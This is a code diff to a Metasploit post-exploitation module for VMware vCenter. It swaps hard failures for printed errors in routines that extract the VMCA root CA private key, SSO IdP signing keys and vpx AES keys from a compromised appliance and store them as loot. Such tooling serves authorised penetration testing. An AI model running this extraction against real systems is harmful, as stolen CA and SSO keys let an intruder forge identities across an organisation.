@@ -65,19 +65,15 @@ class MetasploitModule < Msf::Post
     ])
   end
 
+  # this is only here because of the SSO portion, which will get moved to the vcenter lib once someone is able to provide output to test against.
   def vsphere_bin
     {
-      'ldapsearch' => '/opt/likewise/bin/ldapsearch',
-      'vmafd-cli' => '/usr/lib/vmware-vmafd/bin/vmafd-cli'
+      'ldapsearch' => '/opt/likewise/bin/ldapsearch'
     }
   end
 
   def ldapsearch_bin
     vsphere_bin['ldapsearch']
-  end
-
-  def vmafd_bin
-    vsphere_bin['vmafd-cli']
   end
 
   def psql_bin
@@ -127,10 +123,11 @@ class MetasploitModule < Msf::Post
     self.keystore = {}
 
     vsphere_machine_id = get_machine_id
-    unless is_uuid?(vsphere_machine_id)
-      fail_with(Msf::Exploit::Failure::Unknown, 'Invalid vSphere PSC Machine UUID returned from vmafd-cli')
+    if is_uuid?(vsphere_machine_id)
+      vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
+    else
+      print_bad('Invalid vSphere PSC Machine UUID returned from vmafd-cli')
     end
-    vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
 
     vsphere_domain_name = get_domain_name
     unless is_fqdn?(vsphere_domain_name)
@@ -217,7 +214,8 @@ class MetasploitModule < Msf::Post
     return if vecs_stores.nil?
 
     unless vecs_stores.first
-      fail_with(Msf::Exploit::Failure::Unknown, 'Empty vecs-cli store list returned from vCenter')
+      print_error('Empty vecs-cli store list returned from vCenter')
+      return
     end
 
     vecs_stores.each do |vecs_store|
@@ -260,13 +258,17 @@ class MetasploitModule < Msf::Post
     vprint_status('Extract VMCA_ROOT key ...')
 
     unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate VMCA_ROOT keypair')
+      print_error('Could not locate VMCA_ROOT keypair')
+      return
     end
 
     vmca_key_b64 = read_file('/var/lib/vmware/vmca/privatekey.pem')
 
     vmca_key = validate_pkey(vmca_key_b64)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT private key') if vmca_key.nil?
+    if vmca_key.nil?
+      print_error('Could not extract VMCA_ROOT private key')
+      return
+    end
 
     p = store_loot('vmca', 'PEM', rhost, vmca_key, 'VMCA_ROOT.key', 'vCenter VMCA root CA private key')
     print_good("VMCA_ROOT key: #{p}")
@@ -275,10 +277,14 @@ class MetasploitModule < Msf::Post
     vmca_cert_b64 = read_file('/var/lib/vmware/vmca/root.cer')
 
     vmca_cert = validate_x509_cert(vmca_cert_b64)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT certificate') if vmca_cert.nil?
+    if vmca_cert.nil?
+      print_error('Could not extract VMCA_ROOT certificate')
+      return
+    end
 
     unless vmca_cert.check_private_key(vmca_key)
-      fail_with(Msf::Exploit::Failure::Unknown, 'VMCA_ROOT certificate and private key mismatch')
+      print_error('VMCA_ROOT certificate and private key mismatch')
+      return
     end
 
     p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
@@ -411,7 +417,8 @@ class MetasploitModule < Msf::Post
         print_good('vSphere vmware-vpx AES encryption')
         print_good("\tHEX: #{aes_key}")
       else
-        fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{aes_key_len}")
+        print_error("Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{aes_key_len}")
+        next
       end
 
       extra_service_data = {
@@ -475,10 +482,16 @@ class MetasploitModule < Msf::Post
   def get_idp_creds
     vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')
     idp_keys = get_idp_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key') if idp_keys.nil?
+    if idp_keys.nil?
+      print_error('Error processing IdP trusted certificate private key')
+      return
+    end
 
     idp_certs = get_idp_certs(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain') if idp_certs.nil?
+    if idp_certs.nil?
+      print_error('Error processing IdP trusted certificate chain')
+      return
+    end
 
     vprint_status('Parsing vmwSTSTenantCredential certificates and keys ...')
 
@@ -504,7 +517,8 @@ class MetasploitModule < Msf::Post
     end
 
     unless sts_pem # We were unable to link a public and private key together
-      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to associate IdP certificate and private key')
+      print_error('Unable to associate IdP certificate and private key')
+      return
     end
 
     p = store_loot('idp', 'PEM', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
@@ -773,6 +787,7 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_target
+    # this enumeration phase will also go away once the sso part moves to lib
     vprint_status('Enumerating universal vSphere binaries ...')
     vsphere_bin.each do |k, v|
       vprint_good("\t#{k}: #{v}")
@@ -794,14 +809,16 @@ class MetasploitModule < Msf::Post
 
     self.vcenter_fqdn = get_fqdn
     if vcenter_fqdn.nil?
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter DNS FQDN')
+      print_bad('Could not determine vCenter DNS FQDN')
+      self.vcenter_fqdn = ''
     end
 
     vsphere_machine_ipv4 = get_ipv4
     if vsphere_machine_ipv4.nil?
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter IPv4 address')
+      print_bad('Could not determine vCenter IPv4 address')
+    else
+      print_status("Appliance IPv4: #{vsphere_machine_ipv4}")
     end
-    print_status("Appliance IPv4: #{vsphere_machine_ipv4}")
 
     self.vc_psc_fqdn = get_platform_service_controller(vc_type_management)
     os, build = get_os_version
